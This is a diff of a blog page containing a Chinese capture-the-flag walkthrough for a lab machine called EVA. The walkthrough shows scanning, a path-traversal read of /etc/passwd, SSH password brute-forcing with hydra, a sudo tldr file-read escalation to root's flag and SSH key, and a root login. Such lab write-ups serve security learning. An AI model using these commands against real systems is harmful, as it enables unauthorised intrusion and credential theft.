@@ -340,17 +340,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -382,10 +372,10 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ebebe056ecd2afed9965833132c5935a0f49947ffe6bb42eed6ed8a70bab2855/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383130323630313434342e77656270"><img src="https://camo.githubusercontent.com/ebebe056ecd2afed9965833132c5935a0f49947ffe6bb42eed6ed8a70bab2855/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383130323630313434342e77656270" alt="image-20250608102554020" data-canonical-src="https://7r1umphk.github.io/image/20250608102601444.webp" style="max-width: 100%;"></a></p>
+<div class="markdown-body" id="postBody"><p><img src="https://7r1umphk.github.io/image/20250608102601444.webp" alt="image-20250608102554020" /></p>
 <p>打坤打坤</p>
 <p>探测ip</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ sudo arp-scan -l                                      
 [sudo] password for kali: 
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
@@ -400,7 +390,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 2.044 seconds (125.24 hosts/sec). 4
                        
 </code></pre>
 <p>靶机ip 192.168.205.130，探测服务</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nmap -p- 192.168.205.130            
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:27 EDT
 Nmap scan report for 192.168.205.130
@@ -436,11 +426,11 @@ Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
 
 </code></pre>
 <p>常规，看web</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c5e48d97a09a834e056562022d053bd821cf7349853ac169ec8f7ba29bfa6827/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383130323934373631302e77656270"><img src="https://camo.githubusercontent.com/c5e48d97a09a834e056562022d053bd821cf7349853ac169ec8f7ba29bfa6827/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383130323934373631302e77656270" alt="1" data-canonical-src="https://7r1umphk.github.io/image/20250608102947610.webp" style="max-width: 100%;"></a></p>
-<p>一个关于《龙族》的页面<br>
+<p><img src="https://7r1umphk.github.io/image/20250608102947610.webp" alt="1" /></p>
+<p>一个关于《龙族》的页面
 扒拉了一下源代码，没有什么</p>
 <p>目录爆破</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ dirsearch -u http://192.168.205.130/                                
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
@@ -500,36 +490,36 @@ Starting gobuster in directory enumeration mode
 /dragon.php           (Status: 200) [Size: 10284]
 Progress: 76819 / 1102800 (6.97%)
 </code></pre>
-<p>探测到一个/dragon.php，先看看<br>
-<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/888acd477ea097e58aa9ee0d2721b2618ede357d2d7920a0d37c716a32490819/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383130333233363737382e77656270"><img src="https://camo.githubusercontent.com/888acd477ea097e58aa9ee0d2721b2618ede357d2d7920a0d37c716a32490819/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383130333233363737382e77656270" alt="image-20250608103236313" data-canonical-src="https://7r1umphk.github.io/image/20250608103236778.webp" style="max-width: 100%;"></a></p>
-<p>有四个言灵，扒拉一下源代码<br>
+<p>探测到一个/dragon.php，先看看
+<img src="https://7r1umphk.github.io/image/20250608103236778.webp" alt="image-20250608103236313" /></p>
+<p>有四个言灵，扒拉一下源代码
 源代码重点</p>
-<pre class="notranslate"><code class="notranslate">&lt;div class="incantation-name" data-name="divinedecree"&gt;
+<pre><code>&lt;div class=&quot;incantation-name&quot; data-name=&quot;divinedecree&quot;&gt;
                 DivineDecree
-                &lt;div class="tooltip"&gt;
-                    &lt;div class="tooltip-title"&gt;DIVINE DECREE&lt;/div&gt;
-                    &lt;div class="tooltip-desc"&gt;
+                &lt;div class=&quot;tooltip&quot;&gt;
+                    &lt;div class=&quot;tooltip-title&quot;&gt;DIVINE DECREE&lt;/div&gt;
+                    &lt;div class=&quot;tooltip-desc&quot;&gt;
                         The holy light that illuminates all truth. This ability allows access to all knowledge and secrets.&lt;br&gt;&lt;br&gt;
                         ⚠️ WARNING: DivineDecree can reveal and read ALL content without restrictions. Handle with extreme care!
                     &lt;/div&gt;
                 &lt;/div&gt;
             &lt;/div&gt;
 </code></pre>
-<p>"<g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> 警告：DivineDecree 可以不受限制地显示和阅读所有内容。请格外小心！"</p>
+<p>&quot;⚠️ 警告：DivineDecree 可以不受限制地显示和阅读所有内容。请格外小心！&quot;</p>
 <p>提示我们是一个LFI，然后它按钮确实是发包了</p>
-<pre class="notranslate"><code class="notranslate">&lt;form method="post"&gt;
+<pre><code>&lt;form method=&quot;post&quot;&gt;
             &lt;input 
-                type="text" 
-                name="incantation" 
-                id="incantation-input"
-                class="incantation-input" 
-                placeholder="Enter Incantation..." 
-                autocomplete="off"
+                type=&quot;text&quot; 
+                name=&quot;incantation&quot; 
+                id=&quot;incantation-input&quot;
+                class=&quot;incantation-input&quot; 
+                placeholder=&quot;Enter Incantation...&quot; 
+                autocomplete=&quot;off&quot;
             &gt;
 </code></pre>
 <p>所以大概拼接一下incantation=DivineDecree</p>
 <p>burp抓一下</p>
-<pre class="notranslate"><code class="notranslate">POST /dragon.php HTTP/1.1
+<pre><code>POST /dragon.php HTTP/1.1
 Host: 192.168.205.130
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -549,8 +539,8 @@ incantation=divinedecree
 <p>两个方案</p>
 <p>你可以拿burp intruder fuzz</p>
 <p>或者拿wfuzz fuzz，我演示wfuzz</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd" -X POST -d "incantation=divinedecree" --hh 10213
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd&quot; -X POST -d &quot;incantation=divinedecree&quot; --hh 10213
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -563,7 +553,7 @@ Total requests: 220559
 ID           Response   Lines    Word       Chars       Payload                                                                                                           
 =====================================================================
 
-000000759:   200        347 L    917 W      11711 Ch    "file"                                                                                                            
+000000759:   200        347 L    917 W      11711 Ch    &quot;file&quot;                                                                                                            
 ^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
 
 Total time: 0
@@ -572,7 +562,7 @@ Filtered Requests: 1096
 Requests/sec.: 0
 </code></pre>
 <p>curl一下</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ wget http://192.168.205.130/dragon.php                                                                              
 --2025-06-07 22:42:08--  http://192.168.205.130/dragon.php
 Connecting to 192.168.205.130:80... connected.
@@ -586,7 +576,7 @@ dragon.php                                       [ &lt;=&gt;                    
 
                      
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ curl http://192.168.205.130/dragon.php?file=../../../etc/passwd -X POST -d "incantation=divinedecree" -o 1.php                
+└─$ curl http://192.168.205.130/dragon.php?file=../../../etc/passwd -X POST -d &quot;incantation=divinedecree&quot; -o 1.php                
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 11893    0 11869  100    24  2658k   5504 --:--:-- --:--:-- --:--:-- 2903k
@@ -625,17 +615,17 @@ dragon.php                                       [ &lt;=&gt;                    
 &gt; lumingfei:x:1001:1001::/home/lumingfei:/usr/sbin/nologin
 &gt; uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
 &gt;         
-&gt;                     &lt;div class="effect divinedecree-effect" style="z-index: 5;"&gt;&lt;/div&gt;
+&gt;                     &lt;div class=&quot;effect divinedecree-effect&quot; style=&quot;z-index: 5;&quot;&gt;&lt;/div&gt;
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ diff dragon.php 1.php |grep "bash"
+└─$ diff dragon.php 1.php |grep &quot;bash&quot;
 &gt;         root:x:0:0:root:/root:/bin/bash
 &gt; uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
               
 </code></pre>
 <p>拿到一个uesugierii用户，看有没有ssh私钥</p>
 <p>没有，拿去hydra吧</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ hydra -l uesugierii -P 5000q.txt ssh://192.168.205.130 -I -u -f -e nsr -t 64                            
 Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -650,7 +640,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-07 22:45:
                             
 </code></pre>
 <p>uesugierii:sakura，ssh登录</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ ssh uesugierii@192.168.205.130
 The authenticity of host '192.168.205.130 (192.168.205.130)' can't be established.
 ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
@@ -679,7 +669,7 @@ uesugierii@EVA:~$ id
 uid=1002(uesugierii) gid=1002(uesugierii) groups=1002(uesugierii)
 </code></pre>
 <p>扒拉信息</p>
-<pre class="notranslate"><code class="notranslate">uesugierii@EVA:~$ sudo -l
+<pre><code>uesugierii@EVA:~$ sudo -l
 
 We trust you have received the usual lecture from the local System
 Administrator. It usually boils down to these three things:
@@ -869,20 +859,20 @@ ping
 ping
 </code></pre>
 <p>纯猜谜，ping为0，pong为1</p>
-<pre class="notranslate"><code class="notranslate">uesugierii@EVA:~$ sed 's/ping/0/g; s/pong/1/g' eva.pinglog |tr -d "\n"
+<pre><code>uesugierii@EVA:~$ sed 's/ping/0/g; s/pong/1/g' eva.pinglog |tr -d &quot;\n&quot;
 010001100110100101101110011001110110000101101100001110100100001001101100011000010110001101101011011100110110100001100101011001010111000001110111011000010110110001101100
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a26a5bafa2e6f16f69d9eb82e7880833e3a5c1b8b279110f6ed223c66059e750/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383131313733383634312e77656270"><img src="https://camo.githubusercontent.com/a26a5bafa2e6f16f69d9eb82e7880833e3a5c1b8b279110f6ed223c66059e750/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383131313733383634312e77656270" alt="image-20250608111738243" data-canonical-src="https://7r1umphk.github.io/image/20250608111738641.webp" style="max-width: 100%;"></a></p>
+<p><img src="https://7r1umphk.github.io/image/20250608111738641.webp" alt="image-20250608111738243" /></p>
 <p>Fingal:Blacksheepwall</p>
 <p>登录</p>
-<pre class="notranslate"><code class="notranslate">EVA:~$ su Fingal
+<pre><code>EVA:~$ su Fingal
 Password: 
 $ bash
 Fingal@EVA:/home/uesugierii$ id
 uid=1000(Fingal) gid=1000(Fingal) groups=1000(Fingal)
 </code></pre>
 <p>继续找信息</p>
-<pre class="notranslate"><code class="notranslate">Fingal@EVA:/home/uesugierii$ cd ~
+<pre><code>Fingal@EVA:/home/uesugierii$ cd ~
 Fingal@EVA:~$ ls -la
 total 32
 drwx------ 2 Fingal Fingal 4096 Jun  6 10:48 .
@@ -911,7 +901,7 @@ flag{user-da00c95d-42d7-11f0-a8f0-000c2955ba04}
 <li>所有规则均不可更改且不可撤销</li>
 </ol>
 <p>扒拉一个pspy过来，看看是不是有迹可循</p>
-<pre class="notranslate"><code class="notranslate">Fingal@EVA:~$ busybox wget 192.168.205.206/pspy64
+<pre><code>Fingal@EVA:~$ busybox wget 192.168.205.206/pspy64
 Connecting to 192.168.205.206 (192.168.205.206:80)
 pspy64               100% |***********************************************************************************************************************************| 3032k  0:00:00 ETA
 Fingal@EVA:~$ chmod +x pspy64 
@@ -919,25 +909,25 @@ Fingal@EVA:~$ ./pspy64
 2025/06/07 23:21:52 CMD: UID=0     PID=3558   | /bin/bash /usr/local/bin/dragon_rule 
 2025/06/07 23:21:52 CMD: UID=0     PID=3559   | sudo usermod -s /usr/sbin/nologin lumingfei 
 </code></pre>
-<p>关键的两句，他先执行了/usr/local/bin/dragon_rule ，然后以管理员权限修改用户，将登录 Shell 为 <code class="notranslate">/usr/sbin/nologin</code>，即禁止该用户登录系统。</p>
+<p>关键的两句，他先执行了/usr/local/bin/dragon_rule ，然后以管理员权限修改用户，将登录 Shell 为 <code>/usr/sbin/nologin</code>，即禁止该用户登录系统。</p>
 <p>瞄眼看能不能看dragon_rule</p>
-<pre class="notranslate"><code class="notranslate">Fingal@EVA:~$ ls -la /usr/local/bin/dragon_rule
+<pre><code>Fingal@EVA:~$ ls -la /usr/local/bin/dragon_rule
 -rwx------ 1 root root 784 Jun  6 09:15 /usr/local/bin/dragon_rule
 </code></pre>
 <p>不能拿等拿了root再看吧</p>
-<pre class="notranslate"><code class="notranslate">Fingal@EVA:~$ su lumingfei
+<pre><code>Fingal@EVA:~$ su lumingfei
 Password: 
 This account is currently not available.
 </code></pre>
 <p>确实登录不了，其实处理方法很简单，我猜测dragon_rule是一个监听文本的脚本，监听的就是kernel.txt，所以，如果这个文件没有了，他就挂掉了</p>
-<pre class="notranslate"><code class="notranslate">Fingal@EVA:~$ mv kernel.txt kernel.txt.bak
+<pre><code>Fingal@EVA:~$ mv kernel.txt kernel.txt.bak
 Fingal@EVA:~$ su lumingfei
 Password: 
 lumingfei@EVA:/home/Fingal$ id
 uid=1001(lumingfei) gid=1001(lumingfei) groups=1001(lumingfei)
 </code></pre>
 <p>继续找信息</p>
-<pre class="notranslate"><code class="notranslate">lumingfei@EVA:/home/Fingal$ cd 
+<pre><code>lumingfei@EVA:/home/Fingal$ cd 
 lumingfei@EVA:~$ ls -al
 total 20
 drwx------ 2 lumingfei lumingfei 4096 Jun  6 09:12 .
@@ -953,7 +943,7 @@ User lumingfei may run the following commands on EVA:
     (ALL) NOPASSWD: /usr/local/bin/tldr
 </code></pre>
 <p>能执行tldr，如果你经常看群主的视频，你就会非常熟悉tldr，他喜欢拿tldr看socat的语句，示范一下</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ tldr 
 Command 'tldr' not found, but can be installed with:
 sudo apt install tealdeer
@@ -1028,7 +1018,7 @@ Successfully updated cache.
 
   Send data with multicast routing scheme:
 
-      echo "Hello Multicast" | socat - UDP4-DATAGRAM:224.0.0.1:5000
+      echo &quot;Hello Multicast&quot; | socat - UDP4-DATAGRAM:224.0.0.1:5000
 
   Receive data from a multicast:
 
@@ -1038,7 +1028,7 @@ Successfully updated cache.
 </code></pre>
 <p>挺好用的，可以下载试试，回顾正题</p>
 <p>看看帮助文档</p>
-<pre class="notranslate"><code class="notranslate">lumingfei@EVA:~$ sudo /usr/local/bin/tldr --help
+<pre><code>lumingfei@EVA:~$ sudo /usr/local/bin/tldr --help
 usage: tldr command [options]
 
 Python command line client for tldr
@@ -1049,7 +1039,7 @@ positional arguments:
 optional arguments:
   -h, --help            show this help message and exit
   -v, --version         show program's version number and exit
-  --search "KEYWORDS"   Search for a specific command from a query
+  --search &quot;KEYWORDS&quot;   Search for a specific command from a query
   -u, --update, --update_cache
                         Update the local cache of pages and exit
   -k, --clear-cache     Delete the local cache of pages and exit
@@ -1068,19 +1058,19 @@ optional arguments:
   --print-completion {bash,zsh,tcsh}
                         print shell completion script
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/01a154180f70ffa788528092b39f4c60e77aa3981bd370e5157e906769082e32/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383131333330333639312e77656270"><img src="https://camo.githubusercontent.com/01a154180f70ffa788528092b39f4c60e77aa3981bd370e5157e906769082e32/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303630383131333330333639312e77656270" alt="image-20250608113303243" data-canonical-src="https://7r1umphk.github.io/image/20250608113303691.webp" style="max-width: 100%;"></a></p>
+<p><img src="https://7r1umphk.github.io/image/20250608113303691.webp" alt="image-20250608113303243" /></p>
 <p>提权的关键</p>
 <p>-r, --render 渲染本地markdown 文件</p>
 <p>-m, --markdown 仅打印纯文本页面文件。</p>
 <p>那直接看root.txt就ok了</p>
-<pre class="notranslate"><code class="notranslate">lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/root.txt
+<pre><code>lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/root.txt
 flag{root-da00c95d-42d7-11f0-a8f0-000c2955ba04}
 </code></pre>
 <p>看有没有ssh私钥</p>
-<pre class="notranslate"><code class="notranslate">lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_rsa   
+<pre><code>lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_rsa   
 </code></pre>
 <p>没有，找ssh配置文件看看，有啥私钥</p>
-<pre class="notranslate"><code class="notranslate">lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /etc/ssh/ssh_config
+<pre><code>lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /etc/ssh/ssh_config
 
 # This is the ssh client system-wide configuration file.  See
 # ssh_config(5) for more information.  This file provides defaults for
@@ -1148,7 +1138,7 @@ RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
 
 </code></pre>
 <p>扒拉过来本地</p>
-<pre class="notranslate"><code class="notranslate">lumingfei@EVA:~$ vim id
+<pre><code>lumingfei@EVA:~$ vim id
 lumingfei@EVA:~$ cat id 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
@@ -1177,17 +1167,17 @@ root@EVA:~# id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 <p>扒拉一下脚本，看看怎么实现的</p>
-<pre class="notranslate"><code class="notranslate">root@EVA:~# cat /usr/local/bin/dragon_rule
+<pre><code>root@EVA:~# cat /usr/local/bin/dragon_rule
 #!/bin/bash
 
 RULES=(
-    "Lu Mingfei's safety is the top priority"
-    "Immediate rescue operation when Lu Mingfei's life is endangered"
-    "All rules are unmodifiable and irrevocable"
+    &quot;Lu Mingfei's safety is the top priority&quot;
+    &quot;Immediate rescue operation when Lu Mingfei's life is endangered&quot;
+    &quot;All rules are unmodifiable and irrevocable&quot;
 )
 verify_rules() {
-    for rule in "${RULES[@]}"; do
-        if ! grep -qF "$rule" /home/Fingal/kernel.txt; then
+    for rule in &quot;${RULES[@]}&quot;; do
+        if ! grep -qF &quot;$rule&quot; /home/Fingal/kernel.txt; then
             return 1
         fi
     done
@@ -1208,7 +1198,7 @@ inotifywait -m -e modify,delete /home/Fingal/kernel.txt 2&gt;/dev/null | while r
 done
 </code></pre>
 <p>ai生成的逻辑流程图</p>
-<pre class="notranslate"><code class="notranslate">┌──────────────────────────────┐
+<pre><code>┌──────────────────────────────┐
 │ 监听 kernel.txt 修改/删除事件 │
 └────────────┬─────────────────┘
              │
@@ -1224,7 +1214,8 @@ done
 禁止 lumingfei 登录       允许 lumingfei 登录
 保持 dragon-monitor 运行    停止并禁用 dragon-monitor
 </code></pre>
-<p>那有个想法，wsl2使用kali的不是天天要修改两个hosts吗？设置一个监听，如果linux hosts有修改就复制去windows hosts，完美解决，哈哈哈，你们自己去尝试吧</p></div>
+<p>那有个想法，wsl2使用kali的不是天天要修改两个hosts吗？设置一个监听，如果linux hosts有修改就复制去windows hosts，完美解决，哈哈哈，你们自己去尝试吧</p>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -1249,7 +1240,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 